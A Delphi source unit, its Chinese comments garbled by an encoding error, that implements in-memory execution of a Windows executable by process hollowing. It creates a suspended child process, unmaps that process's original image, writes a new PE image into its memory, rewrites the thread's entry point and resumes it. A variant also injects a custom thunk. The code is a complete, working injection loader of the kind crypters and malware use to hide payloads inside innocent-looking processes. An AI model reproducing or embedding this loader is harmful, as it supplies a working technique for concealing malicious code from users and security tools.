{ ******************************************************* }
{ *                 ���ڴ��м��ز�����exe               * }
{ ******************************************************* }
{ * ������                                                }
{ * Buffer: �ڴ��е�exe��ַ                               }
{ * Len: �ڴ���exeռ�ó���                                }
{ * CmdParam: �����в���(������exe�ļ�����ʣ�������в�����}
{ * ProcessId: ���صĽ���Id                               }
{ * ����ֵ�� ����ɹ��򷵻ؽ��̵�Handle(ProcessHandle),   }
{            ���ʧ���򷵻�INVALID_HANDLE_VALUE           }
{ ******************************************************* }

unit PEUnit;

interface

uses Windows, SysUtils, HUtil32, classes;

function MemExecute(const ABuffer; Len: Integer; CmdParam: string; var ProcessId: Cardinal): Cardinal;
function MemExecute_ex(const ABuffer; Len: Integer; CmdParam: string; var ProcessId: Cardinal; thunk: TMemoryStream): Cardinal;
function MyVirtualAllocEx(hProcess: THandle; lpAddress: Pointer;
  dwSize, flAllocationType: DWORD; flProtect: DWORD): Pointer; stdcall; external 'Kernel32.dll' Name 'VirtualAllocEx';

implementation

{.$R ExeShell.res}// ��ǳ���ģ��(98��ʹ��)

type
  TImageSectionHeaders = array[0..0] of TImageSectionHeader;
  PImageSectionHeaders = ^TImageSectionHeaders;

  { ��������Ĵ�С }

function GetAlignedSize(Origin, Alignment: Cardinal): Cardinal;
begin
  Result := (Origin + Alignment - 1) div Alignment * Alignment;
end;

{ �������pe��������Ҫռ�ö����ڴ棬δֱ��ʹ��OptionalHeader.SizeOfImage��Ϊ�������Ϊ��˵�еı��������ɵ�exe���ֵ����0 }

function CalcTotalImageSize(MzH: PImageDosHeader; FileLen: Cardinal; peH: PImageNtHeaders;
  peSecH: PImageSectionHeaders): Cardinal;
var
  i: Integer;
begin
  {����peͷ�Ĵ�С}
  Result := GetAlignedSize(peH.OptionalHeader.SizeOfHeaders, peH.OptionalHeader.SectionAlignment);

  {�������нڵĴ�С}
  for i := 0 to peH.FileHeader.NumberOfSections - 1 do
    if peSecH[i].PointerToRawData + peSecH[i].SizeOfRawData > FileLen then {// �����ļ���Χ}  begin
      Result := 0;
      exit;
    end
    else if peSecH[i].VirtualAddress <> 0 then //��������ĳ�ڵĴ�С
      if peSecH[i].Misc.VirtualSize <> 0 then
        Result := GetAlignedSize(peSecH[i].VirtualAddress + peSecH[i].Misc.VirtualSize, peH.OptionalHeader.SectionAlignment)
      else
        Result := GetAlignedSize(peSecH[i].VirtualAddress + peSecH[i].SizeOfRawData, peH.OptionalHeader.SectionAlignment)
    else if peSecH[i].Misc.VirtualSize < peSecH[i].SizeOfRawData then
      Result := Result + GetAlignedSize(peSecH[i].SizeOfRawData, peH.OptionalHeader.SectionAlignment)
    else
      Result := Result + GetAlignedSize(peSecH[i].Misc.VirtualSize, peH.OptionalHeader.SectionAlignment);

end;
{ ����pe���ڴ沢�������н� }

function AlignPEToMem(const Buf; Len: Integer; var peH: PImageNtHeaders;
  var peSecH: PImageSectionHeaders; var Mem: Pointer; var ImageSize: Cardinal): Boolean;
var
  SrcMz: PImageDosHeader; // DOSͷ
  SrcPeH: PImageNtHeaders; // PEͷ
  SrcPeSecH: PImageSectionHeaders; // �ڱ�
  i: Integer;
  l: Cardinal;
  Pt: Pointer;
begin
  Result := false;
  SrcMz := @Buf;
  if Len < sizeof(TImageDosHeader) then exit;
  if SrcMz.e_magic <> IMAGE_DOS_SIGNATURE then exit;
  if Len < SrcMz._lfanew + sizeof(TImageNtHeaders) then exit;
  SrcPeH := Pointer(Integer(SrcMz) + SrcMz._lfanew);
  if (SrcPeH.Signature <> IMAGE_NT_SIGNATURE) then exit;
  if (SrcPeH.FileHeader.Characteristics and IMAGE_FILE_DLL <> 0) or
    (SrcPeH.FileHeader.Characteristics and IMAGE_FILE_EXECUTABLE_IMAGE = 0)
    or (SrcPeH.FileHeader.SizeOfOptionalHeader <> sizeof(TImageOptionalHeader)) then exit;
  SrcPeSecH := Pointer(Integer(SrcPeH) + sizeof(TImageNtHeaders));
  ImageSize := CalcTotalImageSize(SrcMz, Len, SrcPeH, SrcPeSecH);
  if ImageSize = 0 then
    exit;
  Mem := VirtualAlloc(nil, ImageSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE); // �����ڴ�
  if Mem <> nil then begin
    // ������Ҫ���Ƶ�PEͷ�ֽ���
    l := SrcPeH.OptionalHeader.SizeOfHeaders;
    for i := 0 to SrcPeH.FileHeader.NumberOfSections - 1 do
      if (SrcPeSecH[i].PointerToRawData <> 0) and (SrcPeSecH[i].PointerToRawData < l) then
        l := SrcPeSecH[i].PointerToRawData;
    Move(SrcMz^, Mem^, l);
    peH := Pointer(Integer(Mem) + PImageDosHeader(Mem)._lfanew);
    peSecH := Pointer(Integer(peH) + sizeof(TImageNtHeaders));

    Pt := Pointer(Cardinal(Mem) + GetAlignedSize(peH.OptionalHeader.SizeOfHeaders, peH.OptionalHeader.SectionAlignment));
    for i := 0 to peH.FileHeader.NumberOfSections - 1 do begin
      // ��λ�ý����ڴ��е�λ��
      if peSecH[i].VirtualAddress <> 0 then
        Pt := Pointer(Cardinal(Mem) + peSecH[i].VirtualAddress);

      if peSecH[i].SizeOfRawData <> 0 then begin
        // �������ݵ��ڴ�
        Move(Pointer(Cardinal(SrcMz) + peSecH[i].PointerToRawData)^, Pt^, peSecH[i].SizeOfRawData);
        if peSecH[i].Misc.VirtualSize < peSecH[i].SizeOfRawData then
          Pt := Pointer(Cardinal(Pt) + GetAlignedSize(peSecH[i].SizeOfRawData, peH.OptionalHeader.SectionAlignment))
        else
          Pt := Pointer(Cardinal(Pt) + GetAlignedSize(peSecH[i].Misc.VirtualSize, peH.OptionalHeader.SectionAlignment));
        // pt ��λ����һ�ڿ�ʼλ��
      end
      else
        Pt := Pointer(Cardinal(Pt) + GetAlignedSize(peSecH[i].Misc.VirtualSize, peH.OptionalHeader.SectionAlignment));
    end;
    Result := True;
  end;
end;

{type
  TVirtualAllocEx = function(hProcess: THandle; lpAddress: Pointer;
    dwSize, flAllocationType: DWORD; flProtect: DWORD): Pointer; stdcall;

var
  MyVirtualAllocEx          : TVirtualAllocEx = nil;}

{function IsNT: Boolean;
begin
  Result := Assigned(MyVirtualAllocEx);
end;}

{ ������ǳ��������� }

function PrepareShellExe(CmdParam: string; BaseAddr, ImageSize: Cardinal): string;
var
  r, h, sz: Cardinal;
  p: Pointer;
  fid, l: Integer;
  Buf: Pointer;
  peH: PImageNtHeaders;
  peSecH: PImageSectionHeaders;
begin
  //if IsNT then begin
    { NT ϵͳ��ֱ��ʹ������������Ϊ��ǽ��� }
  if CmdParam <> '' then
    Result := format('"%s" %s', [ParamStr(0), CmdParam])
  else
    Result := format('"%s"', [ParamStr(0)]);
  //end else begin
    // ����98ϵͳ���޷����·�����ǽ���ռ���ڴ�,���Ա��뱣֤���е���ǳ���������Ŀ����̲��Ҽ��ص�ַһ��
    // �˴�ʹ�õķ����Ǵ���Դ���ͷų�һ�����Ƚ����õ���ǳ���,Ȼ��ͨ���޸���PEͷʹ������ʱ�ܼ��ص�ָ����ַ������������Ŀ�����
    (*
    r := FindResource(HInstance, ('SHELL_EXE'), RT_RCDATA);
    h := LoadResource(HInstance, r);
    p := LockResource(h);
    l := SizeOfResource(HInstance, r);
    GetMem(Buf, l);
    Move(p^, Buf^, l);                  // �����ڴ�
    FreeResource(h);
    peH := Pointer(Integer(Buf) + PImageDosHeader(Buf)._lfanew);
    peSecH := Pointer(Integer(peH) + sizeof(TImageNtHeaders));
    peH.OptionalHeader.ImageBase := BaseAddr; // �޸�PEͷ�صļ��ػ�ַ
    if peH.OptionalHeader.SizeOfImage < ImageSize then {// Ŀ�����Ǵ�,�޸���ǳ�������ʱռ�õ��ڴ�} begin
      sz := ImageSize - peH.OptionalHeader.SizeOfImage;
      Inc(peH.OptionalHeader.SizeOfImage, sz); // ������ռ���ڴ���
      Inc(peSecH[peH.FileHeader.NumberOfSections - 1].Misc.VirtualSize, sz); // �������һ��ռ���ڴ���
    end;

    // ������ǳ����ļ���, Ϊ������ĺ�׺���õ���
    // ���ڲ��� uses SysUtils (һ�� use �˳�������80K����), ����͵��������ֻ֧���������11�����̣���׺��Ϊ.dat, .da0~.da9
    Result := ParamStr(0);
    Result := copy(Result, 1, length(Result) - 4) + '.dat';
    r := 0;
    while r < 10 do begin
      fid := CreateFile(pchar(Result), GENERIC_READ or GENERIC_WRITE, 0, nil, Create_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
      if fid < 0 then begin
        Result := copy(Result, 1, length(Result) - 3) + 'da' + Char(r + Byte('0'));
        Inc(r);
      end
      else begin
        //SetFilePointer(fid, Imagesize, nil, 0);
        //SetEndOfFile(fid);
        //SetFilePointer(fid, 0, nil, 0);
        WriteFile(fid, Buf^, l, h, nil); // д���ļ�
        CloseHandle(fid);
        break;
      end;
    end;
    if CmdParam <> '' then
      Result := format('"%s" %s', [Result, CmdParam])
    else
      Result := format('"%s"', [Result]);
    FreeMem(Buf);
    *)
  //end;
end;

{�Ƿ�������ض����б�}

function HasRelocationTable(peH: PImageNtHeaders): Boolean;
begin
  Result := (peH.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress <> 0)
    and (peH.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size <> 0);
end;

type
  PImageBaseRelocation = ^TImageBaseRelocation;
  TImageBaseRelocation = packed record
    VirtualAddress: Cardinal;
    SizeOfBlock: Cardinal;
  end;

  { �ض���PE�õ��ĵ�ַ }

procedure DoRelocation(peH: PImageNtHeaders; OldBase, NewBase: Pointer);
var
  Delta: Cardinal;
  p: PImageBaseRelocation;
  pw: PWord;
  i: Integer;
begin
  Delta := Cardinal(NewBase) - peH.OptionalHeader.ImageBase;
  p := Pointer(Cardinal(OldBase) + peH.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
  while (p.VirtualAddress + p.SizeOfBlock <> 0) do begin
    pw := Pointer(Integer(p) + sizeof(p^));
    for i := 1 to (p.SizeOfBlock - sizeof(p^)) div 2 do begin
      if pw^ and $F000 = $3000 then
        Inc(PCardinal(Cardinal(OldBase) + p.VirtualAddress + (pw^ and $0FFF))^, Delta);
      Inc(pw);
    end;
    p := Pointer(pw);
  end;
end;

type
  TZwUnmapViewOfSection = function(Handle, BaseAdr: Cardinal): Cardinal; stdcall;

  { ж��ԭ���ռ���ڴ� }

function UnloadShell(ProcHnd, BaseAddr: Cardinal): Boolean;
var
  M: HModule;
  ZwUnmapViewOfSection: TZwUnmapViewOfSection;
begin
  Result := false;
  M := LoadLibrary('ntdll.dll');
  if M <> 0 then begin
    //ZwUnmapViewOfSection := MyGetProcAddress(M, ('ZwUnmapViewOfSection'));
    ZwUnmapViewOfSection := GetProcAddress(M, ('ZwUnmapViewOfSection'));
    if Assigned(ZwUnmapViewOfSection) then
      Result := (ZwUnmapViewOfSection(ProcHnd, BaseAddr) = 0);
    FreeLibrary(M);
  end;
end;

{ ������ǽ��̲���ȡ���ַ����С�͵�ǰ����״̬ }

function CreateChild(Cmd: string; var Ctx: TContext; var ProcHnd, ThrdHnd, ProcId, BaseAddr, ImageSize: Cardinal): Boolean;
var
  si: TStartUpInfo;
  pi: TProcessInformation;
  Old: Cardinal;
  MemInfo: TMemoryBasicInformation;
  p: Pointer;
begin
  FillChar(si, sizeof(si), 0);
  FillChar(pi, sizeof(pi), 0);
  si.cb := sizeof(si);
  Result := CreateProcess(nil, pchar(Cmd), nil, nil, false, Create_SUSPENDED, nil, nil, si, pi); // �Թ���ʽ���н���
  if Result then begin
    ProcHnd := pi.hProcess;
    ThrdHnd := pi.hThread;
    ProcId := pi.dwProcessId;

    { ��ȡ��ǽ�������״̬��[ctx.Ebx+8]�ڴ洦�������ǽ��̵ļ��ػ�ַ��ctx.Eax�������ǽ��̵���ڵ�ַ }
    Ctx.ContextFlags := CONTEXT_FULL;
    GetThreadContext(ThrdHnd, Ctx);
    ReadProcessMemory(ProcHnd, Pointer(Ctx.Ebx + 8), @BaseAddr, sizeof(Cardinal), Old); // ��ȡ���ػ�ַ
    p := Pointer(BaseAddr);

    { ������ǽ���ռ�е��ڴ� }
    while VirtualQueryEx(ProcHnd, p, MemInfo, sizeof(MemInfo)) <> 0 do begin
      if MemInfo.State = MEM_FREE then
        break;
      p := Pointer(Cardinal(p) + MemInfo.RegionSize);
    end;
    ImageSize := Cardinal(p) - Cardinal(BaseAddr);
  end;
end;

{ ������ǽ��̲���Ŀ������滻��Ȼ��ִ�� }

function AttachPE(CmdParam: string; peH: PImageNtHeaders; peSecH: PImageSectionHeaders;
  Ptr: Pointer; ImageSize: Cardinal; var ProcId: Cardinal): Cardinal;
var
  s: string;
  Addr, Size: Cardinal;
  Ctx: TContext;
  Old: Cardinal;
  p: Pointer;
  Thrd: Cardinal;
begin
  Result := INVALID_HANDLE_VALUE;
  s := PrepareShellExe(CmdParam, peH.OptionalHeader.ImageBase, ImageSize);
  if CreateChild(s, Ctx, Result, Thrd, ProcId, Addr, Size) then begin
    p := nil;
    if (peH.OptionalHeader.ImageBase = Addr) and (Size >= ImageSize) then {// ��ǽ��̿�������Ŀ����̲��Ҽ��ص�ַһ��}  begin
      p := Pointer(Addr);
      VirtualProtectEx(Result, p, Size, PAGE_EXECUTE_READWRITE, Old);
    end
    else {if IsNT then}  begin // 98 ��ʧ��
      if UnloadShell(Result, Addr) then // ж����ǽ���ռ���ڴ�
        // ���°�Ŀ����̼��ػ�ַ�ʹ�С�����ڴ�
        p := MyVirtualAllocEx(Result, Pointer(peH.OptionalHeader.ImageBase), ImageSize, MEM_RESERVE or MEM_COMMIT, PAGE_EXECUTE_READWRITE);
      if (p = nil) and HasRelocationTable(peH) then {// �����ڴ�ʧ�ܲ���Ŀ�����֧���ض���}  begin
        // �������ַ�����ڴ�
        p := MyVirtualAllocEx(Result, nil, ImageSize, MEM_RESERVE or MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if p <> nil then
          DoRelocation(peH, Ptr, p); // �ض���
      end;
    end;
    if p <> nil then begin
      WriteProcessMemory(Result, Pointer(Ctx.Ebx + 8), @p, sizeof(DWORD), Old); // ����Ŀ��������л����еĻ�ַ
      peH.OptionalHeader.ImageBase := Cardinal(p);
      if WriteProcessMemory(Result, p, Ptr, ImageSize, Old) then {// ����PE���ݵ�Ŀ�����}  begin
        Ctx.ContextFlags := CONTEXT_FULL;
        if Cardinal(p) = Addr then
          Ctx.Eax := peH.OptionalHeader.ImageBase + peH.OptionalHeader.AddressOfEntryPoint // �������л����е���ڵ�ַ
        else
          Ctx.Eax := Cardinal(p) + peH.OptionalHeader.AddressOfEntryPoint;
        SetThreadContext(Thrd, Ctx); // �������л���
        ResumeThread(Thrd); // ִ��
        CloseHandle(Thrd);
      end
      else begin // ����ʧ��,ɱ����ǽ���
        TerminateProcess(Result, 0);
        CloseHandle(Thrd);
        CloseHandle(Result);
        Result := INVALID_HANDLE_VALUE;
      end;
    end
    else begin // ����ʧ��,ɱ����ǽ���
      TerminateProcess(Result, 0);
      CloseHandle(Thrd);
      CloseHandle(Result);
      Result := INVALID_HANDLE_VALUE;
    end;
  end;
end;

function MemExecute(const ABuffer; Len: Integer; CmdParam: string; var ProcessId: Cardinal): Cardinal;
var
  peH: PImageNtHeaders;
  peSecH: PImageSectionHeaders;
  Ptr: Pointer;
  peSz: Cardinal;
begin
  Result := INVALID_HANDLE_VALUE;
  if AlignPEToMem(ABuffer, Len, peH, peSecH, Ptr, peSz) then begin
    Result := AttachPE(CmdParam, peH, peSecH, Ptr, peSz, ProcessId);
    VirtualFree(Ptr, peSz, MEM_DECOMMIT);
    //VirtualFree(Ptr, 0, MEM_RELEASE);
  end;
end;

function AttachPE_ex(CmdParam: string; peH: PImageNtHeaders; peSecH: PImageSectionHeaders;
  Ptr: Pointer; ImageSize: Cardinal; var ProcId: Cardinal; thunk: TMemoryStream): Cardinal;
var
  s: string;
  Addr, Size: Cardinal;
  Ctx: TContext;
  Old: Cardinal;
  p: Pointer;
  Thrd: Cardinal;

//  thunk: TMemoryStream;
  entry: Cardinal;
begin
  Result := INVALID_HANDLE_VALUE;
  s := PrepareShellExe(CmdParam, peH.OptionalHeader.ImageBase, ImageSize);
  if CreateChild(s, Ctx, Result, Thrd, ProcId, Addr, Size) then begin
    p := nil;
    if (peH.OptionalHeader.ImageBase = Addr) and (Size >= ImageSize) then {// ��ǽ��̿�������Ŀ����̲��Ҽ��ص�ַһ��}  begin
      p := Pointer(Addr);
      VirtualProtectEx(Result, p, Size, PAGE_EXECUTE_READWRITE, Old);
    end
    else {if IsNT then}  begin // 98 ��ʧ��
      if UnloadShell(Result, Addr) then // ж����ǽ���ռ���ڴ�
        // ���°�Ŀ����̼��ػ�ַ�ʹ�С�����ڴ�
        p := MyVirtualAllocEx(Result, Pointer(peH.OptionalHeader.ImageBase), ImageSize, MEM_RESERVE or MEM_COMMIT, PAGE_EXECUTE_READWRITE);
      if (p = nil) and HasRelocationTable(peH) then {// �����ڴ�ʧ�ܲ���Ŀ�����֧���ض���}  begin
        // �������ַ�����ڴ�
        p := MyVirtualAllocEx(Result, nil, ImageSize, MEM_RESERVE or MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if p <> nil then
          DoRelocation(peH, Ptr, p); // �ض���
      end;
    end;
    if p <> nil then begin
      WriteProcessMemory(Result, Pointer(Ctx.Ebx + 8), @p, sizeof(DWORD), Old); // ����Ŀ��������л����еĻ�ַ
      peH.OptionalHeader.ImageBase := Cardinal(p);
      if WriteProcessMemory(Result, p, Ptr, ImageSize, Old) then {// ����PE���ݵ�Ŀ�����}  begin

        if Cardinal(p) = Addr then
          entry := peH.OptionalHeader.ImageBase + peH.OptionalHeader.AddressOfEntryPoint // �������л����е���ڵ�ַ
        else
          entry := Cardinal(p) + peH.OptionalHeader.AddressOfEntryPoint;

        thunk.Position := 1;
        thunk.Write(entry, 4);
        thunk.Position := 0;
        p := MyVirtualAllocEx(Result, nil, thunk.Size, MEM_RESERVE or MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if p <> nil then
        begin
          WriteProcessMemory(Result, p, Pointer(thunk.Memory), thunk.Size, Old); // ����Ŀ��������л����еĻ�ַ
        end;
        Ctx.Eax := Cardinal(p) + 6;

        Ctx.ContextFlags := CONTEXT_FULL;

        SetThreadContext(Thrd, Ctx); // �������л���
        ResumeThread(Thrd); // ִ��
        CloseHandle(Thrd);
      end
      else begin // ����ʧ��,ɱ����ǽ���
        TerminateProcess(Result, 0);
        CloseHandle(Thrd);
        CloseHandle(Result);
        Result := INVALID_HANDLE_VALUE;
      end;
    end
    else begin // ����ʧ��,ɱ����ǽ���
      TerminateProcess(Result, 0);
      CloseHandle(Thrd);
      CloseHandle(Result);
      Result := INVALID_HANDLE_VALUE;
    end;
  end;
end;

function MemExecute_ex(const ABuffer; Len: Integer; CmdParam: string; var ProcessId: Cardinal; thunk: TMemoryStream): Cardinal;
var
  peH: PImageNtHeaders;
  peSecH: PImageSectionHeaders;
  Ptr: Pointer;
  peSz: Cardinal;
begin
  Result := INVALID_HANDLE_VALUE;
  if AlignPEToMem(ABuffer, Len, peH, peSecH, Ptr, peSz) then begin
    Result := AttachPE_ex(CmdParam, peH, peSecH, Ptr, peSz, ProcessId, thunk);
    VirtualFree(Ptr, peSz, MEM_DECOMMIT);
    //VirtualFree(Ptr, 0, MEM_RELEASE);
  end;
end;

//initialization
  //MyVirtualAllocEx := MyGetProcAddress(GetModuleHandle('Kernel32.dll'), ('VirtualAllocEx'));

end.